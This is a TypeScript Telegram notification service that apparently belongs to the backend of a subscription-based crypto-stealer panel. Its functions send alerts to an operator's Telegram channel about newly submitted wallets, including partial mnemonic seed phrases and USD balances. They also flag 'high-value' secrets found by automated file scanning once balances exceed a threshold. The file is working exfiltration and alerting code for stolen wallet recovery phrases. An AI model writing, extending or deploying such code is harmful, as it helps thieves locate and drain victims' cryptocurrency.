import axios from 'axios';
import { db } from '../../db/connection';
import { eq, desc, count, max } from 'drizzle-orm';
import { telegramConfig, telegramNotifications } from '../../db/schema/other';
import { Logger } from '../../utils/logger';

interface TelegramNotificationData {
  type:
    | 'new_client'
    | 'new_wallet'
    | 'high_balance_secret'
    | 'high_balance_wallet'
    | 'payment_success'
    | 'payment_failed';
  title: string;
  message: string;
  data?: Record<string, any>;
}

export class TelegramService {
  /**
   * Update Telegram configuration
   */
  public static async updateConfig(config: any): Promise<void> {
    try {
      // Check if config exists
      const existing = await db
        .select()
        .from(telegramConfig)
        .where(eq(telegramConfig.id, 1))
        .limit(1);

      const configData = {
        botToken: config.bot_token || null,
        channelId: config.channel_id || null,
        notificationsEnabled: config.notifications_enabled ?? false,
        notifyNewClient: config.notify_new_client ?? false,
        notifyNewWallet: config.notify_new_wallet ?? false,
        notifyHighBalanceSecrets: config.notify_high_balance_secrets ?? false,
        notifyHighBalanceWallet: config.notify_high_balance_wallet ?? false,
        notifyPayments: config.notify_payments ?? false,
        highBalanceThreshold: String(
          typeof config.high_balance_threshold === 'number' ? config.high_balance_threshold : 100,
        ),
        updatedAt: new Date(),
      };

      if (existing.length > 0) {
        // Update existing config
        await db.update(telegramConfig).set(configData).where(eq(telegramConfig.id, 1));
      } else {
        // Insert new config
        await db.insert(telegramConfig).values({
          id: 1,
          ...configData,
          createdAt: new Date(),
        });
      }
    } catch (error) {
      throw error;
    }
  }

  /**
   * Get Telegram configuration from database
   */
  public static async getConfig(): Promise<any> {
    try {
      const config = await db
        .select()
        .from(telegramConfig)
        .orderBy(desc(telegramConfig.id))
        .limit(1);

      // Return default config if none exists
      const defaultConfig = {
        bot_token: null,
        channel_id: null,
        notifications_enabled: false,
        notify_new_client: false,
        notify_new_wallet: false,
        notify_high_balance_secrets: false,
        notify_high_balance_wallet: false,
        notify_payments: false,
        high_balance_threshold: 100,
      };

      // If config exists, merge it with defaults to ensure all fields are present
      if (config.length > 0) {
        const dbConfig = config[0];
        return {
          ...defaultConfig,
          bot_token: dbConfig.botToken,
          channel_id: dbConfig.channelId,
          notifications_enabled: dbConfig.notificationsEnabled,
          notify_new_client: dbConfig.notifyNewClient,
          notify_new_wallet: dbConfig.notifyNewWallet,
          notify_high_balance_secrets: dbConfig.notifyHighBalanceSecrets,
          notify_high_balance_wallet: dbConfig.notifyHighBalanceWallet,
          notify_payments: dbConfig.notifyPayments,
          high_balance_threshold:
            Number(dbConfig.highBalanceThreshold) || defaultConfig.high_balance_threshold,
        };
      } else {
        return defaultConfig;
      }
    } catch (error) {
      throw error;
    }
  }

  /**
   * Test Telegram bot connection
   */
  public static async testConnection(
    botToken: string,
  ): Promise<{ success: boolean; botInfo?: unknown; error?: string }> {
    try {
      const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
        timeout: 10000,
      });

      if (response.data.ok) {
        return {
          success: true,
          botInfo: response.data.result,
        };
      } else {
        return {
          success: false,
          error: response.data.description || 'Unknown error',
        };
      }
    } catch (error) {
      Logger.error('Telegram bot test failed', {
        error: error instanceof Error ? error.message : String(error),
      });

      return {
        success: false,
        error: error instanceof Error ? error.message : 'Connection failed',
      };
    }
  }

  /**
   * Send message to Telegram channel
   */
  public static async sendMessage(
    message: string,
    options: { parse_mode?: 'HTML' | 'Markdown' } = {},
  ): Promise<boolean> {
    try {
      const config = await this.getConfig();

      if (!config.notifications_enabled || !config.bot_token || !config.channel_id) {
        Logger.debug('Telegram notifications disabled or not configured');
        return false;
      }

      const response = await axios.post(
        `https://api.telegram.org/bot${config.bot_token}/sendMessage`,
        {
          chat_id: config.channel_id,
          text: message,
          parse_mode: options.parse_mode || 'HTML',
          disable_web_page_preview: true,
          disable_notification: false,
        },
        {
          timeout: 10000,
        },
      );

      if (response.data.ok) {
        Logger.debug('Telegram message sent successfully');
        await this.logNotification('message', true, message.substring(0, 100));
        return true;
      } else {
        Logger.error('Telegram message failed', {
          error: response.data.description,
        });
        await this.logNotification('message', false, response.data.description || 'Unknown error');
        return false;
      }
    } catch (error) {
      Logger.error('Telegram send message error', {
        error: error instanceof Error ? error.message : String(error),
      });
      await this.logNotification(
        'message',
        false,
        error instanceof Error ? error.message : 'Unknown error',
      );
      return false;
    }
  }

  /**
   * Send structured notification
   */
  public static async sendNotification(notification: TelegramNotificationData): Promise<boolean> {
    try {
      const config = await this.getConfig();

      // Check if this type of notification is enabled
      let shouldSend = false;
      switch (notification.type) {
        case 'new_client':
          shouldSend = config.notify_new_client;
          break;
        case 'new_wallet':
          shouldSend = config.notify_new_wallet;
          break;
        case 'high_balance_secret':
          shouldSend = config.notify_high_balance_secrets;
          break;
        case 'high_balance_wallet':
          shouldSend = config.notify_high_balance_wallet;
          break;
        case 'payment_success':
        case 'payment_failed':
          shouldSend = config.notify_payments;
          break;
      }

      if (!shouldSend || !config.notifications_enabled) {
        Logger.debug('Telegram notification skipped', {
          type: notification.type,
          reason: shouldSend ? 'notifications disabled' : 'notification type disabled',
        });
        return false;
      }

      // Format message with emoji and structure
      const emoji = this.getEmojiForType(notification.type);
      const timestamp = new Date().toLocaleString('en-US', {
        timeZone: 'UTC',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
      });

      let message = `${emoji} <b>${notification.title}</b>\n\n`;
      message += `${notification.message}\n\n`;

      if (notification.data && Object.keys(notification.data).length > 0) {
        message += '<b>📋 Details:</b>\n';
        Object.entries(notification.data).forEach(([key, value]) => {
          if (value !== null && value !== undefined && value !== '') {
            const displayValue = typeof value === 'object' ? JSON.stringify(value) : String(value);
            message += `▫️ <b>${key}:</b> <code>${displayValue}</code>\n`;
          }
        });
        message += '\n';
      }

      message += `<i>Timestamp: ${timestamp} UTC</i>`;

      // Add separator line for readability
      message += '\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';

      const success = await this.sendMessage(message);
      await this.logNotification(notification.type, success, notification.title);

      if (success) {
        Logger.info('Telegram notification sent successfully', {
          type: notification.type,
          title: notification.title,
        });
      }

      return success;
    } catch (error) {
      Logger.error('Telegram notification error', {
        type: notification.type,
        error: error instanceof Error ? error.message : String(error),
      });
      await this.logNotification(
        notification.type,
        false,
        error instanceof Error ? error.message : 'Unknown error',
      );
      return false;
    }
  }

  /**
   * Notify about new client registration
   */
  public static async notifyNewClient(
    username: string,
    ipAddress: string,
    invitedBy?: string,
  ): Promise<void> {
    await this.sendNotification({
      type: 'new_client',
      title: 'New User Registered',
      message: `A new user has joined the platform!`,
      data: {
        Username: username,
        'IP Address': ipAddress,
        'Invited By': invitedBy || 'Direct registration',
        'Registration Time': new Date().toLocaleString(),
        Status: 'Active',
      },
    });
  }

  /**
   * Notify about new wallet submission
   */
  public static async notifyNewWallet(
    username: string,
    wallet: string,
    balance: number,
    mnemonic: string,
  ): Promise<void> {
    const config = await this.getConfig();
    const isHighBalance = balance >= config.high_balance_threshold;

    // Safely truncate mnemonic for preview
    const mnemonicPreview =
      mnemonic && mnemonic.length > 60
        ? `${mnemonic.substring(0, 60)}...`
        : mnemonic || 'Not provided';

    // Send high-balance notification if enabled
    if (isHighBalance && config.notify_high_balance_wallet) {
      await this.sendNotification({
        type: 'high_balance_wallet',
        title: 'High-Value Wallet Detected!',
        message: `High-value wallet submission detected! This wallet exceeds the configured threshold of $${config.high_balance_threshold.toLocaleString()}!`,
        data: {
          Username: username,
          'Wallet Type': wallet || 'Unknown',
          'Balance (USD)': `$${balance.toLocaleString(undefined, {
            minimumFractionDigits: 2,
            maximumFractionDigits: 8,
          })}`,
          Threshold: `Exceeds $${config.high_balance_threshold.toLocaleString()}`,
          'Mnemonic Preview': mnemonicPreview,
        },
      });
    }

    // Send regular wallet notification if enabled (regardless of balance)
    if (config.notify_new_wallet) {
      await this.sendNotification({
        type: 'new_wallet',
        title: 'New Wallet Submitted',
        message: `New cryptocurrency wallet has been submitted.`,
        data: {
          Username: username,
          'Wallet Type': wallet || 'Unknown',
          'Balance (USD)': `$${balance.toLocaleString(undefined, {
            minimumFractionDigits: 2,
            maximumFractionDigits: 8,
          })}`,
          Threshold: isHighBalance
            ? `Exceeds $${config.high_balance_threshold.toLocaleString()}`
            : `Below $${config.high_balance_threshold.toLocaleString()}`,
          'Mnemonic Preview': mnemonicPreview,
        },
      });
    }
  }

  /**
   * Notify about high-balance mnemonic secret found
   */
  public static async notifyHighBalanceSecret(
    username: string,
    pattern: string,
    balance: number,
    secretPreview: string,
  ): Promise<void> {
    const config = await this.getConfig();

    if (balance >= config.high_balance_threshold) {
      const safePreview =
        secretPreview && secretPreview.length > 60
          ? `${secretPreview.substring(0, 60)}...`
          : secretPreview || 'Not available';

      await this.sendNotification({
        type: 'high_balance_secret',
        title: 'High-Value Secret Detected!',
        message: `High-value cryptocurrency secret discovered through automated file scanning! This secret exceeds the configured threshold of $${config.high_balance_threshold.toLocaleString()}!`,
        data: {
          Username: username,
          'Pattern Type': pattern,
          'Estimated Balance': `$${balance.toLocaleString(undefined, {
            minimumFractionDigits: 2,
            maximumFractionDigits: 8,
          })}`,
          Threshold: `Exceeds $${config.high_balance_threshold.toLocaleString()}`,
          'Secret Preview': safePreview,
          'Discovery Method': 'File Scan',
          'Discovery Time': new Date().toLocaleString(),
        },
      });
    }
  }

  /**
   * Notify about payment events
   */
  public static async notifyPaymentEvent(
    type: 'payment_success' | 'payment_failed',
    username: string,
    amount: number,
    subscriptionType?: string,
    trackId?: string,
  ): Promise<void> {
    const isSuccess = type === 'payment_success';

    await this.sendNotification({
      type,
      title: isSuccess ? 'Payment Successful' : 'Payment Failed',
      message: isSuccess
        ? `Payment completed successfully! User has been granted premium access.`
        : `Payment attempt failed. User may need assistance.`,
      data: {
        Username: username,
        Amount: `$${amount.toLocaleString()}`,
        'Subscription Type': subscriptionType || 'Unknown',
        'Track ID': trackId || 'Not provided',
        Status: isSuccess ? 'Completed' : 'Failed',
        'Event Time': new Date().toLocaleString(),
      },
    });
  }

  /**
   * Get emoji for notification type
   */
  private static getEmojiForType(type: string): string {
    switch (type) {
      case 'new_client':
        return '🎉';
      case 'new_wallet':
        return '💳';
      case 'high_balance_secret':
        return '💎';
      case 'high_balance_wallet':
        return '💰';
      case 'payment_success':
        return '✅';
      case 'payment_failed':
        return '❌';
      default:
        return '📢';
    }
  }

  /**
   * Get notification statistics
   */
  public static async getNotificationStats(): Promise<{
    total_sent: number;
    last_sent: string | null;
    config_status: 'configured' | 'partial' | 'not_configured';
  }> {
    try {
      const stats = await db
        .select({
          total_sent: count(),
          last_sent: max(telegramNotifications.createdAt),
        })
        .from(telegramNotifications);

      const statsData = stats[0];

      // Check config status
      const config = await this.getConfig();
      let configStatus: 'configured' | 'partial' | 'not_configured';

      if (config.bot_token && config.channel_id && config.notifications_enabled) {
        configStatus = 'configured';
      } else if (config.bot_token || config.channel_id) {
        configStatus = 'partial';
      } else {
        configStatus = 'not_configured';
      }

      return {
        total_sent: statsData.total_sent,
        last_sent: statsData.last_sent?.toISOString() || null,
        config_status: configStatus,
      };
    } catch (error) {
      throw error;
    }
  }

  /**
   * Log notification attempt
   */
  private static async logNotification(
    type: string,
    success: boolean,
    message: string,
  ): Promise<void> {
    try {
      await db.insert(telegramNotifications).values({
        type,
        success,
        message: message.substring(0, 500), // Limit message length for storage
        createdAt: new Date(),
      });
    } catch (error) {
      Logger.error('Failed to log Telegram notification', {
        error: error instanceof Error ? error.message : String(error),
      });
      throw error;
    }
  }
}
